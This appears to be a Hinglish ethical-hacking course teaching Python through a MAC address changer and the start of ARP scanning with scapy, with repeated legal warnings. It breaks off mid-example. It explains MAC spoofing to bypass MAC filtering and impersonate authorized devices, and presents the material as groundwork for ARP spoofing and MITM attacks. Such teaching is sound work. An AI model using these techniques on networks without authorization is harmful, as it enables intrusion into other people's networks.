# üîê Python & Ethical Hacking - Complete Hinglish Course ## Learn Python &
Ethical Hacking from Scratch --- ## üìö COURSE STRUCTURE OVERVIEW **Total
Modules:** 12 **Total Pages:** ~280 **Difficulty Progression:** Beginner ‚≠ê ‚Üí
Advanced ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê **Learning Path:** Linear (prerequisites marked) --- ## ‚ö†Ô∏è
LEGAL & ETHICAL WARNING **üö® BAHUT ZAROORI - PEHLE YEH PADHO! üö®** **Kya hai
yeh?** Yeh course ethical hacking sikhata hai - matlab authorized testing ke
liye security skills. **Kyun zaroori hai?** Kyunki bina permission ke kisi bhi
system par yeh techniques use karna **ILLEGAL** hai. **Legal Consequences
(Kanuni Natije):** - **IPC Section 66 & IT Act 2000:** Unauthorized computer
access - 3 saal jail + fine - **Bina permission WiFi hack karna:** ILLEGAL -
**Dusre ke network par ARP spoofing:** ILLEGAL - **Backdoor create karke
distribute karna:** ILLEGAL **‚úÖ Legal Ways to Practice:** 1. **Apne khud ke
systems par** (own virtual machines) 2. **HackTheBox, TryHackMe** platforms 3.
**Bug Bounty Programs** (HackerOne, Bugcrowd - companies permission deti hain)
4. **DVWA** (Damn Vulnerable Web App - practice ke liye) **Ethical Hacker ka
Rule:** ``` IF permission_granted AND own_system: run_attack() ELSE:
print("ILLEGAL! Don't proceed!") ``` --- # MODULE 1: Python Basics & Environment
Setup **Difficulty:** Beginner ‚≠ê **Pages:** 1-6 **Prerequisites:** None ## What
You'll Learn (Kya Seekhoge): Is module mein tum Python ki basic setup, file
execution, aur variables seekhoge. Yeh foundation hai jo aage saare hacking
tools banane mein kaam aayega. Python kyun? Kyunki yeh simple hai, powerful hai,
aur cross-platform hai (Windows, Linux, Mac sabpe chalti hai). --- ## 1.1 Python
Environment Setup **Source:** Page 1 **Original:** ‚úì ### Hinglish Explanation:
**Kya hai yeh?** Python ek programming language hai jo hacking tools banane ke
liye perfect hai. Ise run karne ke liye Python interpreter chahiye. **Kyun
zaroori hai?** Bina Python ke tum koi bhi hacking script nahi chala sakte.
Python 2 aur Python 3 dono versions hain, lekin hum Python 3 use karenge (modern
aur secure). **Kab use karna?** Jab bhi tum Python script likho ya run karo.
**Real-world Example:** Ek penetration tester apne Kali Linux machine par Python
3 install karta hai taaki woh network scanning tools bana sake. ### Topics: 1.
**File ko save karna:** - Apni file ko `.py` extension ke saath save karo -
Example: `hello.py`, `mac_changer.py` 2. **Terminal se run karna:** ```bash
python hello.py # Python 2 ke liye python3 hello.py # Python 3 ke liye
(RECOMMENDED) ``` 3. **IDE Setup:** - **PyCharm** editor use karenge
(professional IDE) - Alternative: VS Code, Sublime Text ### Line-by-Line Code
Example: ```python #!/usr/bin/env python3 # Line 1: Shebang line - Linux/Mac ko
batata hai ki yeh Python 3 script hai print("Hello, Ethical Hacker!") # Line 2:
print() function screen par message dikhata hai # Output: Hello, Ethical Hacker!
``` **Breakdown:** - **Line 1:** `#!/usr/bin/env python3` - Yeh optional hai
Windows par, lekin Linux/Mac par zaroori hai - **Line 2:** `print()` - Python ka
built-in function jo output dikhata hai - **Expected Output:** Terminal mein
"Hello, Ethical Hacker!" print hoga ### Hands-On Challenge (Hinglish): **Task:**
1. Apne system par Python 3 install karo 2. Ek file banao `first_script.py` naam
se 3. Usme `print("My first hacking script!")` likho 4. Terminal se run karo:
`python3 first_script.py` **Ethical Tip:** ‚ö†Ô∏è Yeh basic setup hai. Aage jo tools
banayenge, woh sirf apne lab environment mein test karna. Dusre ke system par
bina permission use karna IT Act 2000 ke under crime hai. --- ## 1.2
Understanding MAC Address **Source:** Page 2 **Original:** ‚úì ### Hinglish
Explanation: **Kya hai yeh?** MAC (Media Access Control) address ek unique
identifier hai jo har network device ko manufacturer assign karta hai. Yeh 6
octets (12 hexadecimal digits) ka hota hai, jaise: `00:11:22:33:44:55` **Kyun
zaroori hai?** Network ke andar devices ko identify karne ke liye MAC address
use hota hai. Agar tum MAC address change kar sako, toh tum apni identity hide
kar sakte ho ya kisi aur device ki nakal kar sakte ho (impersonation). **Kab use
karna?** - Network anonymity chahiye ho - Bypass karna ho MAC filtering -
Penetration testing mein device impersonation ke liye **Real-world Example:** Ek
company ke WiFi network mein sirf authorized MAC addresses ko access hai. Ek
pentester authorized device ka MAC address copy karke network mein ghus sakta
hai (authorized testing mein). ### Topics: **MAC vs IP Address:** | Feature |
MAC Address | IP Address | |---------|-------------|------------| | **Purpose**
| Network ke andar identify karna | Internet par identify karna | | **Assigned
by** | Manufacturer (permanent) | Router/DHCP (temporary) | | **Format** |
`00:11:22:33:44:55` | `192.168.1.10` | | **Layer** | Data Link Layer (Layer 2) |
Network Layer (Layer 3) | | **Changeable?** | Haan (software se) | Haan
(automatically) | **Network Packet Structure:** ``` [Source MAC] [Destination
MAC] [Source IP] [Destination IP] [Data] ``` Har packet mein source aur
destination dono ka MAC address hota hai. ### Line-by-Line Code Example:
```python import subprocess # Line 1: subprocess module import karte hain # Yeh
module system commands execute karne deta hai subprocess.call("ifconfig",
shell=True) # Line 2: ifconfig command run karta hai # ifconfig = interface
configuration (network details dikhata hai) # shell=True matlab command ko shell
mein execute karo # Output: Tumhare network interfaces ki details (including MAC
address) ``` **Breakdown:** - **Line 1:** `import subprocess` - Python ka
built-in module jo OS commands run kar sakta hai - **Line 2:**
`subprocess.call()` - Command execute karta hai aur wait karta hai completion
tak - **`ifconfig`** - Linux/Mac command (Windows mein `ipconfig` use hota hai)
- **`shell=True`** - Command ko shell environment mein run karo - **Expected
Output:** ``` eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>
  mtu 1500 inet 10.0.2.15 netmask 255.255.255.0 ether 08:00:27:3f:4a:2b
  txqueuelen 1000 (Ethernet) ``` Yahan `ether 08:00:27:3f:4a:2b` tumhara MAC
  address hai. ### Hands-On Challenge: **Task:** 1. Terminal kholo 2. `ifconfig`
  (Linux/Mac) ya `ipconfig /all` (Windows) command run karo 3. Apne network
  interface ka MAC address note karo 4. Python script banao jo yeh MAC address
  print kare **Ethical Tip:** ‚ö†Ô∏è MAC address change karna legal hai apne device
  par, lekin isse kisi network ki security bypass karna (bina permission)
  illegal hai. Sirf authorized penetration testing mein use karo. --- ## 1.3
  Changing MAC Address Manually **Source:** Page 3 **Original:** ‚úì ### Hinglish
  Explanation: **Kya hai yeh?** MAC address ko manually change karna - yeh
  network anonymity aur testing ke liye zaroori skill hai. **Kyun zaroori hai?**
  - **Anonymity:** Tumhari real identity hide ho jaati hai - **Bypass MAC
  Filtering:** Kuch networks sirf specific MAC addresses ko allow karte hain -
  **Impersonation:** Authorized device ki nakal karke access le sakte ho
  (testing mein) **Kab use karna?** Authorized penetration testing mein jab tum
  network security test kar rahe ho. **Real-world Example:** Ek security
  researcher company ke WiFi network test kar raha hai. Network sirf employee
  devices ko allow karta hai. Researcher ek authorized MAC address use karke
  vulnerability check karta hai. ### Topics: **Manual MAC Change Commands
  (Linux/Kali):** ```bash ifconfig eth0 down # Step 1: Network interface ko
  disable karo # eth0 = interface ka naam (tumhara wlan0, wlan1 bhi ho sakta
  hai) ifconfig eth0 hw ether 00:11:22:33:44:55 # Step 2: Naya MAC address set
  karo # hw = hardware # ether = Ethernet type # 00:11:22:33:44:55 = naya MAC
  address ifconfig eth0 up # Step 3: Interface ko wapas enable karo ifconfig
  eth0 # Step 4: Verify karo ki MAC change hua ya nahi ``` ### Line-by-Line
  Explanation: **Command 1:** `ifconfig eth0 down` - **Kya karta hai?** Network
  interface ko temporarily disable karta hai - **Kyun?** MAC address change
  karne se pehle interface band karna zaroori hai - **Output:** Koi output nahi,
  interface disable ho jaata hai **Command 2:** `ifconfig eth0 hw ether
  00:11:22:33:44:55` - **Kya karta hai?** Hardware (MAC) address change karta
  hai - **`hw`** = hardware address - **`ether`** = Ethernet type address -
  **`00:11:22:33:44:55`** = Tumhara naya MAC (koi bhi valid MAC use kar sakte
  ho) - **Output:** Koi output nahi, MAC change ho jaata hai **Command 3:**
  `ifconfig eth0 up` - **Kya karta hai?** Interface ko wapas enable karta hai -
  **Kyun?** Taaki network connection wapas kaam kare - **Output:** Interface
  active ho jaata hai **Command 4:** `ifconfig eth0` - **Kya karta hai?**
  Current interface details dikhata hai - **Kyun?** Verify karne ke liye ki MAC
  successfully change hua - **Expected Output:** ``` eth0:
  flags=4163<UP,BROADCAST,RUNNING,MULTICAST>
    ether 00:11:22:33:44:55 ‚Üê Yeh tumhara naya MAC hai ``` ### Hands-On
    Challenge: **Task:** 1. Apna current MAC address note karo 2. Upar diye gaye
    commands use karke MAC change karo 3. Verify karo ki change hua 4. Original
    MAC wapas set karo (reboot karke ya manually) **Ethical Tip:** ‚ö†Ô∏è Yeh
    technique sirf apne lab/authorized testing ke liye use karo. Dusre ke
    network par bina permission MAC spoofing karna illegal hai. Bug bounty
    programs jaise HackerOne par practice karo. --- # MODULE 2: Python
    Programming for Hacking **Difficulty:** Beginner ‚≠ê‚≠ê **Pages:** 4-13
    **Prerequisites:** Module 1 ## What You'll Learn: Is module mein tum Python
    programming ke woh concepts seekhoge jo hacking tools banane ke liye zaroori
    hain - subprocess module, variables, user input, command-line arguments,
    functions, aur conditionals. --- ## 2.1 Using Python Modules & Executing
    System Commands **Source:** Page 4 **Original:** ‚úì **Added:** 2025 best
    practices ### Hinglish Explanation: **Kya hai yeh?** Python modules
    ready-made code libraries hain. `subprocess` module system commands execute
    karne deta hai - jaise terminal mein command type karte ho. **Kyun zaroori
    hai?** Hacking tools ko system ke saath interact karna padta hai - network
    interfaces change karna, files access karna, processes run karna. Subprocess
    module yeh sab karne deta hai. **Kab use karna?** Jab bhi tumhe Python
    script se OS-level commands run karne hon. **Real-world Example:** Ek
    network scanner tool `ifconfig` command use karke available network
    interfaces discover karta hai, phir unpar scanning karta hai. ### Topics:
    **Subprocess Module ke 3 Main Functions:** | Function | Kya Karta Hai | Kab
    Use Kare | |----------|---------------|--------------| | `subprocess.call()`
    | Command execute karta hai, completion ka wait karta hai | Jab output ki
    zaroorat nahi | | `subprocess.check_output()` | Command execute karta hai,
    output return karta hai | Jab output chahiye | | `subprocess.Popen()` |
    Command alag thread mein execute karta hai | Jab background mein run karna
    ho | ### Line-by-Line Code Example: **File:** `mac_changer.py` ```python
    #!/usr/bin/env python3 # Line 1: Shebang - Linux/Mac ko batata hai Python 3
    use karo import subprocess # Line 2: subprocess module import karte hain #
    Yeh module system commands run karne deta hai subprocess.call("ifconfig",
    shell=True) # Line 3: ifconfig command execute karta hai # shell=True:
    Command ko shell environment mein run karo # Output: Screen par network
    interfaces ki details print hongi ``` **Breakdown:** - **Line 1:** Shebang
    line (optional Windows par) - **Line 2:** `import subprocess` - Module ko
    script mein laate hain - **Line 3:** - `subprocess.call()` - Function jo
    command run karta hai - `"ifconfig"` - Command string (Linux/Mac network
    command) - `shell=True` - Shell ke through execute karo (security risk hai
    production mein, lekin learning ke liye OK) - **Expected Output:** Tumhare
    system ke saare network interfaces ki details **Security Note (2025
    Update):** `shell=True` use karna security risk hai agar user input le rahe
    ho. Better way: ```python subprocess.call(["ifconfig"]) # List format -
    safer ``` ### Hands-On Challenge: **Task:** 1. `mac_changer.py` file banao
    2. Upar diya gaya code likho 3. Terminal se run karo: `python3
    mac_changer.py` 4. Output mein apna MAC address dhundho **Ethical Tip:** ‚ö†Ô∏è
    Subprocess module powerful hai - isse system-level changes kar sakte ho.
    Sirf authorized testing mein use karo. Production code mein `shell=True`
    avoid karo (command injection vulnerability). --- ## 2.2 Implementing a
    Basic MAC Changer **Source:** Page 5 **Original:** ‚úì ### Hinglish
    Explanation: **Kya hai yeh?** Ek Python script jo automatically MAC address
    change kar de - manual commands type karne ki zaroorat nahi. **Kyun zaroori
    hai?** Automation time bachata hai aur errors kam karta hai. Ek baar script
    bana lo, baar-baar use kar sakte ho. **Kab use karna?** Jab tumhe frequently
    MAC address change karna ho (penetration testing mein). **Real-world
    Example:** Ek pentester different MAC addresses test karta hai to check if
    network properly filters devices. Script use karke woh quickly multiple MACs
    try kar sakta hai. ### Line-by-Line Code Example: ```python #!/usr/bin/env
    python3 import subprocess # Lines 1-2: Setup (already explained)
    subprocess.call("ifconfig wlan0 down", shell=True) # Line 3: wlan0 interface
    ko disable karo # wlan0 = wireless interface (tumhara eth0 bhi ho sakta hai)
    # Kya hota hai? WiFi temporarily off ho jaata hai subprocess.call("ifconfig
    wlan0 hw ether 00:11:22:33:44:66", shell=True) # Line 4: Naya MAC address
    set karo # 00:11:22:33:44:66 = naya MAC (hardcoded) # Kya hota hai?
    Interface ka MAC address change ho jaata hai subprocess.call("ifconfig wlan0
    up", shell=True) # Line 5: Interface ko wapas enable karo # Kya hota hai?
    WiFi wapas on ho jaata hai, naye MAC ke saath ``` **Breakdown:** - **Line
    3:** Interface down karna zaroori hai MAC change se pehle - **Line 4:**
    Actual MAC change command - **Line 5:** Interface wapas up karna taaki
    network kaam kare **Expected Output:** Koi screen output nahi, lekin tumhara
    MAC address change ho jaayega. Verify karne ke liye: ```bash ifconfig wlan0
    | grep ether ``` ### Hands-On Challenge: **Task:** 1. Script ko
    `basic_mac_changer.py` naam se save karo 2. Apne interface ka naam check
    karo (`ifconfig` se) 3. Script mein `wlan0` ko apne interface se replace
    karo 4. Run karo: `sudo python3 basic_mac_changer.py` (sudo zaroori hai) 5.
    MAC address verify karo **Ethical Tip:** ‚ö†Ô∏è Yeh script sirf apne device par
    use karo. Dusre ke device ka MAC change karna (remote se) unauthorized
    access hai aur illegal hai. --- ## 2.3 Variables & Strings **Source:** Page
    6 **Original:** ‚úì ### Hinglish Explanation: **Kya hai yeh?** Variables
    memory mein ek location hain jahan values store hoti hain. Strings text data
    hain. **Kyun zaroori hai?** Hardcoded values (jaise MAC address) ko
    variables mein store karke code flexible aur reusable ban jaata hai. **Kab
    use karna?** Jab bhi tumhe values store karni hon jo change ho sakti hain.
    **Real-world Example:** Ek MAC changer tool mein target interface aur new
    MAC ko variables mein store karte hain, taaki easily change kar sako bina
    pura code edit kiye. ### Topics: **Variables in Python:** ```python x = 1 #
    Integer variable y = x + 2 # y ki value 3 hogi name = "Hacker" # String
    variable ``` **String Concatenation (Jodna):** ```python first = "Ethical"
    last = "Hacker" full = first + " " + last # "Ethical Hacker" ``` ###
    Line-by-Line Code Example: **File:** `mac_changer_with_variables.py`
    ```python #!/usr/bin/env python3 import subprocess interface = "wlan0" #
    Line 3: Interface naam ko variable mein store karo # Kya hota hai? Ab hum
    'interface' naam use kar sakte hain code mein # Benefit: Ek jagah change
    karo, poore code mein update ho jaayega new_mac = "00:11:22:33:44:88" # Line
    4: Naya MAC address variable mein # Kya hota hai? MAC address easily
    changeable ban gaya # Benefit: Testing ke liye different MACs try kar sakte
    ho print("Changing MAC address for " + interface + " to " + new_mac) # Line
    5: User ko inform karo kya ho raha hai # + operator strings ko jodta hai
    (concatenation) # Output: "Changing MAC address for wlan0 to
    00:11:22:33:44:88" subprocess.call("ifconfig " + interface + " down",
    shell=True) # Line 6: Interface down karo (variable use karke) # Actual
    command: "ifconfig wlan0 down" # Kya hota hai? Interface disable ho jaata
    hai subprocess.call("ifconfig " + interface + " hw ether " + new_mac,
    shell=True) # Line 7: MAC change karo (dono variables use karke) # Actual
    command: "ifconfig wlan0 hw ether 00:11:22:33:44:88" # Kya hota hai? MAC
    address change ho jaata hai subprocess.call("ifconfig " + interface + " up",
    shell=True) # Line 8: Interface wapas up karo # Actual command: "ifconfig
    wlan0 up" # Kya hota hai? Interface enable ho jaata hai naye MAC ke saath
    ``` **Breakdown:** - **Lines 3-4:** Variables define karte hain (reusability
    ke liye) - **Line 5:** User-friendly message (debugging mein helpful) -
    **Lines 6-8:** Variables ko strings ke saath concatenate karke commands
    banate hain **Expected Output:** ``` Changing MAC address for wlan0 to
    00:11:22:33:44:88 (MAC successfully changed) ``` ### Hands-On Challenge:
    **Task:** 1. Script ko run karo 2. `new_mac` variable ki value change karo
    kisi aur MAC se 3. Phir se run karo - dekho kitna easy hai change karna 4.
    `interface` variable bhi change karke try karo **Ethical Tip:** ‚ö†Ô∏è Variables
    use karne se code maintainable banta hai, lekin power ke saath
    responsibility bhi aati hai. Sirf authorized systems par test karo. ---
    **[End of Part 1 - Modules 1-2 Complete]** **Next in Part 2:** - Module 2
    (continued): User Input, Command-Line Arguments, Functions - Module 3: MAC
    Changer - Complete Implementation - Module 4: Network Scanner Basics --- ##
    Quick Reference - Module 1 & 2 **Key Commands:** ```bash python3 script.py #
    Run Python script ifconfig # Show network interfaces (Linux/Mac) ifconfig
    eth0 down # Disable interface ifconfig eth0 hw ether XX # Change MAC sudo
    python3 script.py # Run with admin rights ``` **Key Python Concepts:** -
    `import subprocess` - System commands ke liye - `subprocess.call()` -
    Command execute karo - Variables - Values store karo - String concatenation
    - `"text" + variable + "text"` **Ethical Reminders:** ‚úÖ Own systems par
    practice karo ‚úÖ Virtual machines use karo ‚úÖ Bug bounty programs join karo
    ‚ùå Bina permission dusre systems par test mat karo ‚ùå Public networks par
    unauthorized testing mat karo
    =============================================================</UP,BROADCAST,RUNNING,MULTICAST
  ></UP,BROADCAST,RUNNING,MULTICAST
>

# üîê Python & Ethical Hacking - Part 2 ## Modules 2-4: Advanced Python & Network
Scanning --- ## 2.4 Getting Input from User **Source:** Page 8 **Original:** ‚úì
**Added:** Python 3 compatibility notes ### Hinglish Explanation: **Kya hai
yeh?** User se keyboard ke through input lena - yeh tools ko interactive banata
hai. **Kyun zaroori hai?** Hardcoded values ki jagah user apni choice se
interface aur MAC address de sakta hai. Tool flexible ban jaata hai. **Kab use
karna?** Jab tumhe runtime par values chahiye (different scenarios ke liye).
**Real-world Example:** Ek pentester different networks test karta hai. Har baar
code edit karne ki jagah, woh simply interface naam input kar deta hai. ###
Line-by-Line Code Example: ```python #!/usr/bin/env python3 import subprocess
interface = input("Interface > ") # Line 3: User se interface naam input lo #
input() function prompt dikhata hai aur user ka input return karta hai #
Example: User types "wlan0", toh interface = "wlan0" new_mac = input("New MAC >
") # Line 4: User se naya MAC address input lo # Example: User types
"00:11:22:33:44:99" print("[+] Changing MAC address for " + interface + " to " +
new_mac) # Line 5: Confirmation message # [+] = success indicator (hacking tools
mein common convention) subprocess.call(["ifconfig", interface, "down"])
subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
subprocess.call(["ifconfig", interface, "up"]) # Lines 6-8: MAC change commands
(list format - safer than shell=True) ``` **Breakdown:** - **Line 3:** `input()`
- Python 3 function (Python 2 mein `raw_input()` tha) - **Prompt:** "Interface >
" user ko guide karta hai - **List format:** `["ifconfig", interface, "down"]` -
command injection se safe - **Expected Output:** ``` Interface > wlan0 New MAC >
00:11:22:33:44:99 [+] Changing MAC address for wlan0 to 00:11:22:33:44:99 ```
**Security Note:** List format use karne se command injection attacks prevent
hote hain: ```python # ‚ùå Unsafe (shell=True with user input)
subprocess.call("ifconfig " + interface + " down", shell=True) # ‚úÖ Safe (list
format) subprocess.call(["ifconfig", interface, "down"]) ``` ### Hands-On
Challenge: **Task:** 1. Script run karo 2. Apna interface naam enter karo
(ifconfig se check karo) 3. Koi random MAC enter karo 4. Verify karo ki change
hua **Ethical Tip:** ‚ö†Ô∏è User input lena powerful hai, lekin validate karna
zaroori hai. Malicious input se system compromise ho sakta hai. Production code
mein input validation add karo. --- ## 2.5 Command-Line Arguments with optparse
**Source:** Page 10 **Original:** ‚úì **Added:** argparse alternative (Python 3
standard) ### Hinglish Explanation: **Kya hai yeh?** Command-line arguments -
jaise professional tools mein hota hai (`tool -i eth0 -m 00:11:22:33:44:55`).
**Kyun zaroori hai?** - **Professional look:** Tools command-line se easily use
ho sakte hain - **Automation:** Scripts ko cron jobs ya other scripts se call
kar sakte ho - **Help menu:** Automatic help generation **Kab use karna?** Jab
tum production-ready tool bana rahe ho. **Real-world Example:** Nmap tool: `nmap
-sS -p 80,443 192.168.1.1` - yeh command-line arguments hain. ### Line-by-Line
Code Example: ```python #!/usr/bin/env python3 import subprocess import optparse
# Line 3: optparse module (Python 2 compatible, but deprecated in Python 3)
parser = optparse.OptionParser() # Line 4: Parser object banao # Yeh
command-line arguments parse karega parser.add_option("-i", "--interface",
dest="interface", help="Interface to change its MAC") # Lines 5-6: Interface
option add karo # -i = short form, --interface = long form # dest = variable
naam jisme value store hogi # help = help menu mein dikhega
parser.add_option("-m", "--mac", dest="new_mac", help="New MAC address") # Lines
7-8: MAC option add karo (options, arguments) = parser.parse_args() # Line 9:
Arguments parse karo # options = parsed values ka object # arguments = extra
arguments (agar hain) interface = options.interface new_mac = options.new_mac #
Lines 10-11: Values extract karo subprocess.call(["ifconfig", interface,
"down"]) subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
subprocess.call(["ifconfig", interface, "up"]) # Lines 12-14: MAC change karo
``` **Usage:** ```bash python3 mac_changer.py -i wlan0 -m 00:11:22:33:44:99 # Ya
python3 mac_changer.py --interface wlan0 --mac 00:11:22:33:44:99 ``` **Automatic
Help:** ```bash python3 mac_changer.py -h # Output: # Usage: mac_changer.py
[options] # # Options: # -h, --help show this help message and exit # -i
INTERFACE, --interface=INTERFACE # Interface to change its MAC # -m NEW_MAC,
--mac=NEW_MAC # New MAC address ``` **2025 Update - argparse (Recommended):**
```python import argparse parser = argparse.ArgumentParser(description="MAC
Address Changer") parser.add_argument("-i", "--interface", required=True,
help="Interface name") parser.add_argument("-m", "--mac", required=True,
help="New MAC address") args = parser.parse_args() interface = args.interface
new_mac = args.mac ``` ### Hands-On Challenge: **Task:** 1. Script ko
command-line arguments ke saath run karo 2. `-h` flag try karo (help dekhne ke
liye) 3. Galat arguments deke dekho kya error aata hai 4. argparse version bhi
implement karo **Ethical Tip:** ‚ö†Ô∏è Command-line tools powerful hote hain.
Hamesha input validation add karo. Agar koi malicious MAC address de (jaise
empty string), toh handle karo. --- ## 2.6 Functions & Conditionals **Source:**
Pages 11-12 **Original:** ‚úì ### Hinglish Explanation: **Kya hai yeh?** Functions
- reusable code blocks. Conditionals - decision making (if/else). **Kyun zaroori
hai?** - **Functions:** Code ko organize karte hain, reusability badhate hain -
**Conditionals:** Error handling, validation, different scenarios handle karna
**Kab use karna?** Har professional tool mein functions aur conditionals hote
hain. **Real-world Example:** Ek network scanner mein `scan()` function hai jo
IP range scan karta hai. Agar invalid IP diya, toh conditional check karke error
message dikhata hai. ### Line-by-Line Code Example: ```python #!/usr/bin/env
python3 import subprocess import optparse def get_arguments(): # Line 4:
Function define karo # def = define function keyword # get_arguments = function
ka naam # () = parameters (abhi empty) parser = optparse.OptionParser()
parser.add_option("-i", "--interface", dest="interface") parser.add_option("-m",
"--mac", dest="new_mac") (options, arguments) = parser.parse_args() if not
options.interface: # Line 9: Check karo interface diya ya nahi # not = negation
(agar nahi hai toh) parser.error("[-] Please specify interface, use --help for
info") # error() function program ko stop kar deta hai with message elif not
options.new_mac: # Line 11: Else if - agar interface hai but MAC nahi
parser.error("[-] Please specify MAC address") return options # Line 13: Options
object return karo # Yeh values caller function ko milegi def
change_mac(interface, new_mac): # Line 15: Function with parameters # interface,
new_mac = input parameters print("[+] Changing MAC address for " + interface + "
to " + new_mac) subprocess.call(["ifconfig", interface, "down"])
subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
subprocess.call(["ifconfig", interface, "up"]) # Main execution options =
get_arguments() # Line 22: Function call - get_arguments() execute hoga # Return
value options variable mein store hogi change_mac(options.interface,
options.new_mac) # Line 23: change_mac() function call with arguments ```
**Breakdown:** - **Functions:** Code ko logical blocks mein divide karte hain -
**if/elif:** Multiple conditions check karte hain - **return:** Function se
value wapas bhejta hai - **Expected Output:** ```bash # Agar arguments nahi
diye: python3 mac_changer.py # Output: [-] Please specify interface, use --help
for info # Agar sahi arguments diye: python3 mac_changer.py -i wlan0 -m
00:11:22:33:44:99 # Output: [+] Changing MAC address for wlan0 to
00:11:22:33:44:99 ``` ### Hands-On Challenge: **Task:** 1. Script ko bina
arguments ke run karo - error message dekho 2. Sirf `-i` deke run karo - dusra
error dekho 3. Dono arguments deke run karo - success dekho 4. Ek aur function
add karo jo MAC address validate kare **Ethical Tip:** ‚ö†Ô∏è Error handling zaroori
hai. Agar user galat input de, toh gracefully handle karo. Crash hone se better
hai clear error message dena. --- # MODULE 3: Complete MAC Changer Tool
**Difficulty:** Intermediate ‚≠ê‚≠ê **Pages:** 13-16 **Prerequisites:** Module 2
## What You'll Learn: Is module mein tum ek complete, production-ready MAC
changer tool banayoge with verification, regex, aur proper error handling. ---
## 3.1 Verifying MAC Address Change with Regex **Source:** Pages 14-16
**Original:** ‚úì **Added:** Regex explanation for beginners ### Hinglish
Explanation: **Kya hai yeh?** Regex (Regular Expressions) - patterns match karne
ka powerful tool. Hum isse MAC address extract karenge output se. **Kyun zaroori
hai?** Sirf command run karne se kaam nahi hota - verify bhi karna padta hai ki
MAC actually change hua ya nahi. **Kab use karna?** Jab bhi tumhe text se
specific patterns extract karne hon. **Real-world Example:** Ek security tool
log files mein IP addresses dhundhta hai using regex. Manually search karne se
100x faster. ### Regex Basics: | Pattern | Meaning | Example |
|---------|---------|---------| | `\d` | Digit (0-9) | `\d\d` matches "42" | |
`\w` | Word character (a-z, A-Z, 0-9, _) | `\w+` matches "hello" | | `\w\w:\w\w`
| MAC pattern | Matches "ab:cd" | | `.` | Any character | `a.c` matches "abc",
"a1c" | | `+` | One or more | `\d+` matches "123" | **MAC Address Regex:** ```
\w\w:\w\w:\w\w:\w\w:\w\w:\w\w ``` Yeh pattern match karega: `00:11:22:33:44:55`
### Line-by-Line Code Example: ```python #!/usr/bin/env python3 import
subprocess import optparse import re # Line 4: re = regular expressions module
def get_arguments(): # ... (same as before) pass def change_mac(interface,
new_mac): # ... (same as before) pass def get_current_mac(interface): # Line 12:
Function to get current MAC ifconfig_result =
subprocess.check_output(["ifconfig", interface]) # Line 13: check_output()
command ka output return karta hai # ifconfig_result mein pura output string hai
mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",
str(ifconfig_result)) # Line 14-15: Regex se MAC address search karo # r"..." =
raw string (backslashes ko escape nahi karta) # str() = bytes ko string mein
convert karo # search() = pattern dhundhta hai, match object return karta hai if
mac_address_search_result: # Line 16: Agar MAC mila return
mac_address_search_result.group(0) # group(0) = pura matched string return karo
else: print("[-] Could not read MAC address") return None # Main execution
options = get_arguments() current_mac = get_current_mac(options.interface)
print("[*] Current MAC: " + str(current_mac)) change_mac(options.interface,
options.new_mac) current_mac = get_current_mac(options.interface) # Line 27: MAC
change ke baad wapas check karo if current_mac == options.new_mac: # Line 28:
Verify karo ki MAC change hua print("[+] MAC address successfully changed to " +
current_mac) else: print("[-] MAC address did not change") ``` **Breakdown:** -
**subprocess.check_output():** Output capture karta hai (print nahi karta) -
**re.search():** Pattern dhundhta hai string mein - **group(0):** Matched text
return karta hai - **Verification:** Before/after MAC compare karte hain
**Expected Output:** ```bash python3 mac_changer.py -i wlan0 -m
00:11:22:33:44:99 # Output: [*] Current MAC: 08:00:27:3f:4a:2b [+] Changing MAC
address for wlan0 to 00:11:22:33:44:99 [*] Current MAC: 00:11:22:33:44:99 [+]
MAC address successfully changed to 00:11:22:33:44:99 ``` ### Hands-On
Challenge: **Task:** 1. Script run karo aur output dekho 2. Galat interface naam
deke dekho kya hota hai 3. www.pythex.org par jao aur MAC regex test karo 4.
Regex modify karke IPv4 address match karo (`\d+\.\d+\.\d+\.\d+`) **Ethical
Tip:** ‚ö†Ô∏è Verification zaroori hai security tools mein. Assume mat karo ki
command successful rahi - hamesha verify karo. Yeh professional approach hai.
--- # MODULE 4: Network Scanner Basics **Difficulty:** Intermediate ‚≠ê‚≠ê‚≠ê
**Pages:** 17-22 **Prerequisites:** Modules 1-3 ## What You'll Learn: Network
par devices discover karna, ARP protocol samajhna, aur Python se network packets
bhejni seekhoge. Yeh foundation hai MITM attacks ke liye. --- ## 4.1
Understanding ARP Protocol **Source:** Page 17 **Original:** ‚úì **Added:**
Detailed ARP explanation with diagrams ### Hinglish Explanation: **Kya hai
yeh?** ARP (Address Resolution Protocol) - yeh IP address ko MAC address se map
karta hai. Network ke andar communication ke liye zaroori hai. **Kyun zaroori
hai?** Network mein data bhejne ke liye MAC address chahiye. ARP batata hai ki
kaunse IP ke paas kaunsa MAC hai. **Kab use karna?** - Network scanning (devices
discover karna) - ARP spoofing (MITM attacks) - Network troubleshooting
**Real-world Example:** Tumhara computer `192.168.1.5` ko ping karna chahta hai.
Pehle ARP request bhejega: "Who has 192.168.1.5?" Woh device reply karega: "I
have 192.168.1.5, my MAC is XX:XX:XX:XX:XX:XX" ### ARP Working: **Scenario:**
Computer A (10.0.2.15) wants to talk to Computer B (10.0.2.6) ``` Step 1: ARP
Request (Broadcast) Computer A ‚Üí [BROADCAST to all devices] "Who has 10.0.2.6?
Tell 10.0.2.15" Step 2: ARP Reply (Unicast) Computer B ‚Üí Computer A "I have
10.0.2.6, my MAC is 00:11:22:33:44:66" Step 3: Communication Computer A ‚Üí
Computer B [Now A knows B's MAC, can send data directly] ``` **ARP Packet
Structure:** ``` | Sender MAC | Sender IP | Target MAC | Target IP | Operation |
| 08:00:27.. | 10.0.2.15 | 00:00:00.. | 10.0.2.6 | Request | ``` ### Why ARP is
Important for Hacking: 1. **Network Discovery:** ARP requests se network par
saare devices discover kar sakte ho 2. **ARP Spoofing:** Fake ARP replies bhejke
MITM attack kar sakte ho 3. **MAC Spoofing:** ARP cache poison karke traffic
redirect kar sakte ho ### Line-by-Line Code Example (Concept): ```python import
scapy.all as scapy # Line 1: Scapy - powerful packet manipulation library # ARP
Request banao arp_request = scapy.ARP(pdst="10.0.2.1/24") # Line 3: ARP packet
create karo # pdst = packet destination (target IP range) # /24 = subnet mask
